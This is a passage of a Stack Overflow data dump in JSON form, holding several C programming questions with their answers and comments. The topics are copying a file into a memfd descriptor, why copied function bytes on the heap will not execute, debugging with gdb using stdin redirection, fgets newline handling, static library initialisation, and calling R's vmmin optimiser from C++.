"https://stackoverflow.com/users/12471/jan-kr%c3%bcger"}, "edited": false, "score": 1, "creation_date": 1551881317, "post_id": 55024991, "comment_id": 96802970, "body": "It&#39;s worth noting that there are much more efficient approaches to copy data from one file to another. On Linux, there is a dedicated system function for this, it&#39;s called <code>sendfile</code>. On other systems you can map one of the files into virtual memory to simplify things, using <code>mmap</code>, which is less efficient but still better than the manual version using a buffer."}], "tags": [], "owner": {"reputation": 15776, "user_id": 12471, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ce93e41c69b4e4ea8afce22cf11e2f4?s=128&d=identicon&r=PG", "display_name": "Jan Kr&#252;ger", "link": "https://stackoverflow.com/users/12471/jan-kr%c3%bcger"}, "is_accepted": false, "score": 2, "last_activity_date": 1551881146, "creation_date": 1551881146, "answer_id": 55024991, "question_id": 55024399, "link": "https://stackoverflow.com/questions/55024399/how-to-write-from-a-file-to-a-fd/55024991#55024991", "title": "How to write from a FILE* to a fd?", "body": "<p>The problem with the code you tried is a problem of pointer arithmetic.</p>\n\n<ul>\n<li><code>fgetc</code> returns the byte you read as a value, which you store into <code>c</code>. So far, so good.</li>\n<li><code>write</code> is a little more flexible than <code>fgetc</code> - it can write more than one byte at a time (similar to <code>fread</code>). So you can't just pass it a single integer value as you tried to do - it needs a <em>pointer</em> to a memory location with the byte you want to write. <code>&amp;c</code> is a pointer to the memory used by <code>c</code> - but wait, that's not all yet...</li>\n<li><code>fgetc</code> returns the byte it reads in an <code>int</code>. On all modern platforms, <code>int</code>s are larger than one byte, so that variable <code>c</code> is actually <em>more than</em> a byte (most systems you'll encounter have 4 bytes in an <code>int</code>, which is also what your <code>sizeof</code> will produce, so you'll end up with a file inflated by factor 4). Unfortunately, platforms differ in where exactly the byte you care about is found in the memory for that variable. On many platforms using <code>&amp;c</code> will work, but not on all.</li>\n<li>The better approach is to allocate a fixed-size buffer, then you can read into it with <code>fread</code> and write it into the other FD using <code>write</code>, approximately like this (I left out error handling and other details):</li>\n</ul>\n\n<pre class=\"lang-c prettyprint-override\"><code>#define BUFSIZE 4096\nchar buf[BUFSIZE];\nwhile (1) {\n    size_t num_read = fread(&amp;buf, 1, BUFSIZE, fichier);\n    if (num_read == 0) break;\n    write(shm_fd, &amp;buf, num_read);\n}\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user11050959"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 244, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1551881312, "creation_date": 1551879320, "last_edit_date": 1551881312, "question_id": 55024399, "link": "https://stackoverflow.com/questions/55024399/how-to-write-from-a-file-to-a-fd", "title": "How to write from a FILE* to a fd?", "body": "<p>I would like to copy the content of a <code>FILE*</code> file (a <code>*.so</code> library) into a file descriptor that I'll give to an other function. I've read about <code>fileno()</code>, but it doesn't seem to work properly. \nCould anyone give me a trick to do that ? </p>\n\n<p>Here is my code : </p>\n\n<pre class=\"lang-c prettyprint-override\"><code>int takeFromDisk(char *file){\n    int shm_fd;\n    shm_fd = open_ramfs(); // Give me a file descriptor to memory\n    printf(\"[+] File Descriptor Shared Memory created!\\n\");\n\n    FILE *fichier = fopen(file, \"r\");\n\n\n    fclose(fichier);\n    return(shm_fd);\n}\n</code></pre>\n\n<p>And the function I'm using to have my file descriptor :</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>int open_ramfs(void) {\n    int shm_fd;\n\n    //If we have a kernel &lt; 3.17\n    // We need to use the less fancy way\n    if (kernel_version() == 0) {\n        shm_fd = shm_open(SHM_NAME, O_RDWR | O_CREAT, S_IRWXU);\n        if (shm_fd &lt; 0) { //Something went wrong :(\n            fprintf(stderr, \"[-] Could not open file descriptor\\n\");\n            exit(-1);\n        }\n    }\n    // If we have a kernel &gt;= 3.17\n    // We can use the funky style\n    else {\n        shm_fd = memfd_create(SHM_NAME, 1);\n        if (shm_fd &lt; 0) { //Something went wrong :(\n            fprintf(stderr, \"[- Could not open file descriptor\\n\");\n            exit(-1);\n        }\n    }\n    return shm_fd;\n}\n</code></pre>\n\n<p>And the code I tried : </p>\n\n<pre><code>int c;\nwhile ((c = fgetc(fichier)) != EOF)\n{\n  write(shm_fd, &amp;c, sizeof(c));\n}\n</code></pre>\n"}, {"tags": ["c", "function", "dynamic", "malloc"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1551875744, "post_id": 55023184, "comment_id": 96799684, "body": "You can only copy a function and run it if it was assembled with position independant code. Anyway, in <code>unsigned long size = &amp;testend - &amp;test;</code> pointer arithmetic on different objects is <i>undefined behaviour</i>, and also there is no guarantee that <code>testend()</code> is placed in memory where you think it is."}, {"owner": {"reputation": 487, "user_id": 11132825, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a657dd7091f84e884cf5650342aa98?s=128&d=identicon&r=PG&f=1", "display_name": "Adrien", "link": "https://stackoverflow.com/users/11132825/adrien"}, "edited": false, "score": 1, "creation_date": 1551875876, "post_id": 55023184, "comment_id": 96799756, "body": "See <a href=\"https://stackoverflow.com/questions/20233289/execute-instructions-from-the-heap\" title=\"execute instructions from the heap\">stackoverflow.com/questions/20233289/&hellip;</a>"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1551875883, "post_id": 55023184, "comment_id": 96799765, "body": "damned, first how can you suppose <i>testend</i> is produced after <i>test</i> in the binary ? how can you suppose <i>test</i> is code position independent ? and yes probably your system does some protection to not try to execute data, so does not allow to execute code out of the code/text"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1551875883, "post_id": 55023184, "comment_id": 96799766, "body": "This is not possible to answer without a specific system in mind. Calling convention, the function&#39;s machine code, MMU setup, lots of things matter. Lots of systems don&#39;t allow you to execute code from data memory, for safety reasons - preventing run-away code etc."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1551875965, "post_id": 55023184, "comment_id": 96799808, "body": "See this: <a href=\"https://stackoverflow.com/a/54183237/584518\">stackoverflow.com/a/54183237/584518</a>"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1551876029, "post_id": 55023184, "comment_id": 96799845, "body": "<code>unsigned long size = &amp;testend - &amp;test;</code> won&#39;t even compile in MSVC."}], "owner": {"reputation": 1, "user_id": 2862901, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d0301293c15a3762aafe133bb63a515d?s=128&d=identicon&r=PG&f=1", "display_name": "yuempek", "link": "https://stackoverflow.com/users/2862901/yuempek"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 68, "favorite_count": 0, "closed_date": 1551876030, "answer_count": 0, "score": 0, "last_activity_date": 1551876282, "creation_date": 1551875483, "question_id": 55023184, "link": "https://stackoverflow.com/questions/55023184/how-can-i-copy-and-run-a-functions-in-c", "closed_reason": "Duplicate", "title": "How can I copy and run a functions in C", "body": "<p><strong><em>Can I copy and run a function which I know start and end addresses in C?</em></strong> </p>\n\n<p>I wrote a code to test idea but it returns error when I run.</p>\n\n<p>Shortly if I explain what I did:</p>\n\n<p>We can know the start adress of a function with pointer of the function (&amp;<strong>test</strong>).\nWe assume that we know the end address. We can use different methods for this. I added a blank function after the function to do this. (&amp;<strong>testend</strong>) (I know this is not guaranteed method but it is simply to test.)</p>\n\n<p>I allocated a memory by size (End Address - Start Address)</p>\n\n<p>I copied the whole memory of the function to new memory.</p>\n\n<p>When I try to run the new function pointer I am getting error. But why? I just want to understand the mechanism on behind. </p>\n\n<p>Is it necessary the function is in the code/text block to run? Can't I run the code in the heap?</p>\n\n<p><strong>The code:</strong> </p>\n\n<pre class=\"lang-c prettyprint-override\"><code>    #include&lt;stdio.h&gt;\n    #include&lt;stdlib.h&gt;\n    #include&lt;string.h&gt;\n\n    void test(int y){\n        int x;\n\n        printf(\"y:%u, x:%u\\n\", &amp;y, &amp;x);\n    }\n    void testend(){}\n\n    int main() {\n        typedef void (*funcType)(int); \n        funcType func;\n\n        printf(\"test   :%u\\n\", &amp;test);\n        printf(\"testend:%u\\n\", &amp;testend);\n        printf(\"main   :%u\\n\", &amp;main);\n\n        func = &amp;test;\n        func(0); //its working\n\n        unsigned long size = &amp;testend - &amp;test;\n        func = malloc(size);\n        memcpy((char*)func, (char*)(&amp;test), size);\n\n        printf(\"\\n\\n test() function: \\n\");\n        for (int i = 0; i &lt; size; i++)\n          printf(\"%0x \", (unsigned char)((char*)&amp;test)[i]);\n\n        printf(\"\\n\\n new func() function: \\n\");\n        for (int i = 0; i &lt; size; i++)\n          printf(\"%0x \", (unsigned char)((char*)func)[i]);\n\n        func(1); //ERROR! it is not working!\n\n    }\n</code></pre>\n"}, {"tags": ["c", "gdb"], "comments": [{"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 1, "creation_date": 1551873927, "post_id": 55022616, "comment_id": 96798668, "body": "what do you mean ? <code>Monos(1,2)</code> and <code>Monos(6)</code> are the inputs of the program ? If yes start <i>gdb</i> (or <i>ddd</i>) on your program, place breakpoints, run and enter the input by hand when needed depending on the execution / breakpoints"}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1551874118, "post_id": 55022616, "comment_id": 96798773, "body": "You need the GDB documentation, not SO."}, {"owner": {"reputation": 2019, "user_id": 10035556, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/86cea073655558939d961937095efc80?s=128&d=identicon&r=PG&f=1", "display_name": "Mayur", "link": "https://stackoverflow.com/users/10035556/mayur"}, "edited": false, "score": 0, "creation_date": 1551874440, "post_id": 55022616, "comment_id": 96798962, "body": "you need to attach that running process to debugger and configure some break point location in code and wait until that debugger to hit break point location"}, {"owner": {"reputation": 2019, "user_id": 10035556, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/86cea073655558939d961937095efc80?s=128&d=identicon&r=PG&f=1", "display_name": "Mayur", "link": "https://stackoverflow.com/users/10035556/mayur"}, "edited": false, "score": 0, "creation_date": 1551874513, "post_id": 55022616, "comment_id": 96799009, "body": "I am not sure it is good to add youtube video link here. You can use this video as a reference <a href=\"https://www.youtube.com/watch?v=J7L2x1ATOgk\" rel=\"nofollow noreferrer\">youtube.com/watch?v=J7L2x1ATOgk</a>"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1551875526, "post_id": 55022616, "comment_id": 96799572, "body": "@IanAbbott no, `&lt; end&#39; redirect the input from the file <i>end</i>, here the input will give the next lines upto the word <i>end</i> (<i>end</i> is not given of course)"}, {"owner": {"reputation": 51, "user_id": 5500697, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f4d29863484fb3c83b2971a579fef3de?s=128&d=identicon&r=PG&f=1", "display_name": "Coco", "link": "https://stackoverflow.com/users/5500697/coco"}, "edited": false, "score": 0, "creation_date": 1551876002, "post_id": 55022616, "comment_id": 96799829, "body": "&lt;&lt;end Monos(1,2) Monos(6) end is the part interactive with the program, it\u2019s the shell input, not limit the size of  input, Monos(1,2) Monos(6) is the key part, they are strings"}, {"owner": {"reputation": 51, "user_id": 5500697, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f4d29863484fb3c83b2971a579fef3de?s=128&d=identicon&r=PG&f=1", "display_name": "Coco", "link": "https://stackoverflow.com/users/5500697/coco"}, "edited": false, "score": 0, "creation_date": 1551876344, "post_id": 55022616, "comment_id": 96800010, "body": "What I have tried gdb \u2014args ./test 1 2 3 then run &lt; Monos(1,2) Monos(6), but it doesn\u2019t work"}], "answers": [{"comments": [{"owner": {"reputation": 51, "user_id": 5500697, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f4d29863484fb3c83b2971a579fef3de?s=128&d=identicon&r=PG&f=1", "display_name": "Coco", "link": "https://stackoverflow.com/users/5500697/coco"}, "edited": false, "score": 0, "creation_date": 1551877050, "post_id": 55023142, "comment_id": 96800384, "body": "Thanks for your help"}], "tags": [], "owner": {"reputation": 4732, "user_id": 8477999, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f8172e1919af53269de92316dcf03a03?s=128&d=identicon&r=PG&f=1", "display_name": "Gem Taylor", "link": "https://stackoverflow.com/users/8477999/gem-taylor"}, "is_accepted": false, "score": 0, "last_activity_date": 1551875319, "creation_date": 1551875319, "answer_id": 55023142, "question_id": 55022616, "link": "https://stackoverflow.com/questions/55022616/how-to-debug-c-program-with-argument-and-stdin-as-input/55023142#55023142", "title": "How to debug C program with argument and stdin as input", "body": "<p>Don't do this redirection on the gdb command-line, but instead do it on the <code>run</code> command inside gdb.</p>\n\n<p><a href=\"https://sourceware.org/gdb/current/onlinedocs/gdb/Input_002fOutput.html#Input_002fOutput\" rel=\"nofollow noreferrer\">https://sourceware.org/gdb/current/onlinedocs/gdb/Input_002fOutput.html#Input_002fOutput</a></p>\n"}, {"tags": [], "owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "is_accepted": true, "score": 0, "last_activity_date": 1551876323, "creation_date": 1551876323, "answer_id": 55023464, "question_id": 55022616, "link": "https://stackoverflow.com/questions/55022616/how-to-debug-c-program-with-argument-and-stdin-as-input/55023464#55023464", "title": "How to debug C program with argument and stdin as input", "body": "<p>For easier debugging with GDB, you should convert the \"here string\" lines between the <code>&lt;&lt;end</code> and <code>end</code> into a text file (say \"input.txt\").  Then, in <code>gdb</code> you can use the <code>set args</code> command to set up the command-line arguments and redirection of standard input from the file.</p>\n\n<p>For example: suppose the file \"input.txt\" contains:</p>\n\n<pre><code>Monos(1,2)\nMonos(6)\n</code></pre>\n\n<p>Run <code>gdb</code> from the shell as follows:</p>\n\n<pre><code>$ gdb ./test\n</code></pre>\n\n<p>Within GDB, set the command-line arguments and redirection of standard input:</p>\n\n<pre><code>(gdb) set args 1 2 3 &lt; input.txt\n</code></pre>\n\n<p>Set any breakpoints, e.g.:</p>\n\n<pre><code>(gdb) b main\n</code></pre>\n\n<p>And start running the code:</p>\n\n<pre><code>(gdb) r\n</code></pre>\n"}], "owner": {"reputation": 51, "user_id": 5500697, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f4d29863484fb3c83b2971a579fef3de?s=128&d=identicon&r=PG&f=1", "display_name": "Coco", "link": "https://stackoverflow.com/users/5500697/coco"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 843, "favorite_count": 1, "closed_date": 1551885091, "accepted_answer_id": 55023464, "answer_count": 2, "score": -1, "last_activity_date": 1551876323, "creation_date": 1551873501, "last_edit_date": 1551873765, "question_id": 55022616, "link": "https://stackoverflow.com/questions/55022616/how-to-debug-c-program-with-argument-and-stdin-as-input", "closed_reason": "Needs more focus", "title": "How to debug C program with argument and stdin as input", "body": "<p>I want to debug a C program.</p>\n\n<pre><code>./test 1 2 3 &lt;&lt; end\nMonos(1,2)\nMonos(6)\nend\n</code></pre>\n\n<p>How to debug this?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 0, "creation_date": 1551873428, "post_id": 55022509, "comment_id": 96798344, "body": "<code>fgets</code> read the newline and puts it also in the buffer, just remove the <code>&#39;\\n&#39;</code> at the end of <code>str_a</code>."}, {"owner": {"reputation": 6679, "user_id": 10622916, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21bd4eeaa5ba60dc021c5ccfbf4a963d?s=128&d=identicon&r=PG&f=1", "display_name": "Bodo", "link": "https://stackoverflow.com/users/10622916/bodo"}, "edited": false, "score": 0, "creation_date": 1551873437, "post_id": 55022509, "comment_id": 96798350, "body": "The string returned from <code>fgets</code> includes the terminating newline (<code>&#39;\\n&#39;</code>). You have to remove the newline character from the string. See <a href=\"https://stackoverflow.com/q/2693776/10622916\">stackoverflow.com/q/2693776/10622916</a>"}, {"owner": {"reputation": 79, "user_id": 11121866, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5c606ba4795bb917b71dc652871aea9?s=128&d=identicon&r=PG&f=1", "display_name": "val", "link": "https://stackoverflow.com/users/11121866/val"}, "edited": false, "score": 0, "creation_date": 1551874663, "post_id": 55022509, "comment_id": 96799099, "body": "guys reading the linked question and using <code>strtok</code> did help! very many thanks!"}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1551890739, "post_id": 55022509, "comment_id": 96808898, "body": "Also, you do not need <code>strcat</code> for printing, you can use several <code>%s</code>s..."}], "owner": {"reputation": 79, "user_id": 11121866, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5c606ba4795bb917b71dc652871aea9?s=128&d=identicon&r=PG&f=1", "display_name": "val", "link": "https://stackoverflow.com/users/11121866/val"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 31, "favorite_count": 0, "closed_date": 1551873440, "answer_count": 0, "score": 0, "last_activity_date": 1551873215, "creation_date": 1551873215, "question_id": 55022509, "link": "https://stackoverflow.com/questions/55022509/add-two-input-lines-into-the-same-line", "closed_reason": "Duplicate", "title": "Add two input lines into the same line", "body": "<p>I am now slowly changing from Python to C and that might be quite embarrassing sometimes due to major differences in the syntax of the languages. This time, I'm just struggling with how to add two input line in the <strong>same</strong> line. For storing input lines, I use <code>fgets()</code>, and for adding them, I use <code>strcat()</code>. The following code is my little model created in order to solve the problem for a prog more complicated.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\nint main()\n{\n   char str_a[200], str_b[200];\n\n   printf(\"This prog adds two lines in one.\\n\");\n\n   printf(\"Enter the first line:\\n\");\n   fgets(str_a, 200, stdin);\n\n   printf(\"Enter the second line:\\n\");\n   fgets(str_b, 200, stdin);\n\n   strcat(str_a, str_b);\n\n   printf(\"I am adding your lines: %s\\n\", str_a);\n\n   return 0;\n\n}\n</code></pre>\n\n<p>The prog runs well, however, assuming \"I love\" is the first line and \"you\" is the second line, \"I love\" and \"you\" appear on <strong>different</strong> lines, that is, they are separated, as though I was using the Enter button before typing \"you\". What I actually need is to get them on the <strong>same</strong> line, so that one could simply read \"I love you\" just as plain text. Thx a lot =)</p>\n"}, {"tags": ["c", "visual-studio"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1551872521, "post_id": 55022188, "comment_id": 96797804, "body": "The answer is simple: It&#39;s not possible. A static library is really nothing more than a collection of object files. There&#39;s no specific run-time initialization or cleanup for static libraries, since static libraries aren&#39;t loaded at run-time."}, {"owner": {"reputation": 413, "user_id": 10518032, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d91471cd13b1f82257c4311a9e213753?s=128&d=identicon&r=PG&f=1", "display_name": "nm_tp", "link": "https://stackoverflow.com/users/10518032/nm-tp"}, "edited": false, "score": 0, "creation_date": 1551872546, "post_id": 55022188, "comment_id": 96797817, "body": "Maybe this idea would help (GCC specific): <a href=\"https://www.geeksforgeeks.org/__attribute__constructor-__attribute__destructor-syntaxes-c/\" rel=\"nofollow noreferrer\">geeksforgeeks.org/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 80047, "user_id": 169346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645dbb4f7ba1ff9d7ff2de02f68fbe9c?s=128&d=identicon&r=PG", "display_name": "JeremyP", "link": "https://stackoverflow.com/users/169346/jeremyp"}, "is_accepted": true, "score": 0, "last_activity_date": 1551873643, "creation_date": 1551873643, "answer_id": 55022657, "question_id": 55022188, "link": "https://stackoverflow.com/questions/55022188/how-to-call-function-of-a-static-library-when-executing-the-program-that-uses-th/55022657#55022657", "title": "How to call function of a static library when executing the program that uses this library", "body": "<p>A static library \"starts\" and \"finishes\" when the program it is part of starts and finishes. </p>\n\n<p>I put the words \"starts\" and \"finishes\" in quotes, because once the application is linked, there isn't really a static library as such in it. The functions that came from the static library are indistinguishable from the functions that came from the application. </p>\n\n<p>So, if you have stuff that needs to be done before calling any function in a particular static library, you must create an initialisation function and call it explicitly from your code e.g. from your <code>main()</code> function. Similarly, if you have stuff that must be done after you have finished using the functions from the static library, you must create a cleanup function and call it explicitly from your code. This is actually fairly normal practice.</p>\n\n<p>Consider also changing your DLL so that you have to do the initialisation explicitly in exactly the same way. This has a couple of advantages:</p>\n\n<ul>\n<li>You do not need to change your application code if you change the way the library is linked</li>\n<li>The things you can do in <code>DLLMain</code> are pretty restricted. Not even all the functions in the kernel DLL are safe to call. This does not apply to an explicit initialisation function called after the DLL has loaded.</li>\n</ul>\n"}], "owner": {"reputation": 259, "user_id": 7698505, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/921fa549ec6ecc570361422e40b0f3bc?s=128&d=identicon&r=PG&f=1", "display_name": "user7698505", "link": "https://stackoverflow.com/users/7698505/user7698505"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "accepted_answer_id": 55022657, "answer_count": 1, "score": 0, "last_activity_date": 1551873643, "creation_date": 1551872193, "question_id": 55022188, "link": "https://stackoverflow.com/questions/55022188/how-to-call-function-of-a-static-library-when-executing-the-program-that-uses-th", "title": "How to call function of a static library when executing the program that uses this library", "body": "<p>While in a C shared library, one can do the following to execute an initializer or finalizer when the C program that uses this shared library starts or finishes:</p>\n\n<pre><code>BOOL APIENTRY DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)\n{\n    if (reason == DLL_PROCESS_ATTACH)\n    {\n        _initialize();\n    }\n    else if (reason == DLL_PROCESS_DETACH)\n    {\n        _finalize();\n    }\n    return true;\n}\n</code></pre>\n\n<p>This is not working if the same C program is using the static version of the C library instead.</p>\n\n<p>Any idea how this can be fixed?</p>\n"}, {"tags": ["c++", "c", "r", "optimization", "statistics"], "answers": [{"tags": [], "owner": {"reputation": 14779, "user_id": 8386140, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/pUC6i.png?s=128&g=1", "display_name": "duckmayr", "link": "https://stackoverflow.com/users/8386140/duckmayr"}, "is_accepted": true, "score": 2, "last_activity_date": 1551875815, "creation_date": 1551875815, "answer_id": 55023294, "question_id": 55021837, "link": "https://stackoverflow.com/questions/55021837/calling-bfgs-optimization-in-c-from-optim-c/55023294#55023294", "title": "Calling BFGS optimization in C++ from optim.c", "body": "<p>It sounds like you've already been using this advice, but you need to go a bit deeper: <a href=\"http://wiki.c2.com/?UseTheSourceLuke\" rel=\"nofollow noreferrer\">\"Use the source, Luke\"</a>.</p>\n\n<p>My starting point was to, from the R console, type simply</p>\n\n<pre><code>optim\n</code></pre>\n\n<p>This prints the R source code of that function. There I saw it calls</p>\n\n<pre><code>.External2(C_optim, par, fn1, gr1, method, con, lower, upper)\n</code></pre>\n\n<p>My favorite mirror for the R source code is <a href=\"https://github.com/wch/r-source\" rel=\"nofollow noreferrer\">this GitHub repo</a>. If you head there, search for \"optim\", and filter only the C results, we'll go to the top hit, <a href=\"https://github.com/wch/r-source/blob/5a156a0865362bb8381dcd69ac335f5174a4f60c/src/library/stats/src/optim.c\" rel=\"nofollow noreferrer\"><code>src/library/stats/src/optim.c</code></a>. Then we can see how the C-level <a href=\"https://github.com/wch/r-source/blob/5a156a0865362bb8381dcd69ac335f5174a4f60c/src/library/stats/src/optim.c#L177\" rel=\"nofollow noreferrer\"><code>optim()</code></a> (line 177) function <a href=\"https://github.com/wch/r-source/blob/5a156a0865362bb8381dcd69ac335f5174a4f60c/src/library/stats/src/optim.c#L295\" rel=\"nofollow noreferrer\">calls <code>vmmin()</code></a> (line 295).</p>\n\n<p>The way <code>optim()</code> initializes those arguments is as follows</p>\n\n<pre><code>int n           length(par)\ndouble *b       vect(npar); dpar[i] = REAL(par)[i] / (OS-&gt;parscale[i])\ndouble *Fmin    0.0\noptimfn fn      function defined in the C code\noptimgr gr      function defined in the C code\nint maxit       asInteger(getListElement(options, \"maxit\"))\nint trace       asInteger(getListElement(options, \"trace\"))\nint *mask       mask = (int *) R_alloc(npar, sizeof(int));\n                for (i = 0; i &lt; npar; i++) mask[i] = 1;\ndouble abstol   asInteger(getListElement(options, \"abstol\"))\ndouble reltol   asInteger(getListElement(options, \"reltol\"))\nint nREPORT     asInteger(getListElement(options, \"REPORT\"));\nvoid *ex        OptStruct OS; /* tons of stuff done to this */\nint *fncount    0\nint *grcount    0\nint *fail       0\n</code></pre>\n\n<p>I haven't put in all the details here, but I believe this should be enough to help you figure out how you need to use these things in your own function, once you find out about one other thing: the control list in <code>optim()</code>. If you notice in the <code>.External2()</code> call from above, there's an argument called <code>con</code>. This is defined in the R code as</p>\n\n<pre><code>con &lt;- list(trace = 0, fnscale = 1, parscale = rep.int(1, npar),\n        ndeps = rep.int(1e-3, npar),\n        maxit = 100L, abstol = -Inf, reltol = sqrt(.Machine$double.eps),\n        alpha = 1.0, beta = 0.5, gamma = 2.0,\n        REPORT = 10, warn.1d.NelderMead = TRUE,\n        type = 1,\n        lmm = 5, factr = 1e7, pgtol = 0,\n        tmax = 10, temp = 10.0)\n</code></pre>\n\n<p>though these elements can be overridden by user input in the <code>control</code> argument, and if you check out <code>help(\"optim\")</code>, you'll see</p>\n\n<blockquote>\n  <p>The \u2018control\u2019 argument is a list that can supply any of the following components:<br>\n  &nbsp;&nbsp;&nbsp;&nbsp;\u2018trace\u2019 ...</p>\n</blockquote>\n\n<p>The C function refers to this list by the name <code>options</code> that you see referenced several times in the table I constructed above.</p>\n"}], "owner": {"reputation": 867, "user_id": 2340598, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/abef243ec80de5b0757bf3ab016aa72f?s=128&d=identicon&r=PG", "display_name": "maciek", "link": "https://stackoverflow.com/users/2340598/maciek"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 186, "favorite_count": 0, "accepted_answer_id": 55023294, "answer_count": 1, "score": 0, "last_activity_date": 1551875815, "creation_date": 1551871174, "question_id": 55021837, "link": "https://stackoverflow.com/questions/55021837/calling-bfgs-optimization-in-c-from-optim-c", "title": "Calling BFGS optimization in C++ from optim.c", "body": "<p>So I have to rewrite my R code to C++. That is relatively easy, given the <code>Rcpp</code> package. I came across a problem while solving an optimization problem. In R I call:</p>\n\n<pre><code>optimum_optim = optim(par=A, fn=negative_LL, gr=negative_grad_LL, .c = c, .t = t, .i = i, .N = N, method = 'BFGS')\n</code></pre>\n\n<p>Given that I have rewritten the <code>negative_LL</code> and <code>negative_grad_LL</code> functions into my C++ file already I wanted to call the underlying routine for BFGS optimization from R: it is the <code>vmmin</code> function from optim.c<br>\nI have the problem that I cannot understand the signature of that function. It is:</p>\n\n<pre><code>vmmin(int n0, double *b, double *Fmin, optimfn fminfn, optimgr fmingr,\n      int maxit, int trace, int *mask,\n      double abstol, double reltol, int nREPORT, void *ex,\n      int *fncount, int *grcount, int *fail)\n</code></pre>\n\n<p>It's not that I did not put any effort into search - I just cannot find a description... Could someone please help call this function in my particular case (and tell me what the arguments are)?</p>\n"}, {"tags": ["c", "assembly", "x86", "operating-system"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, 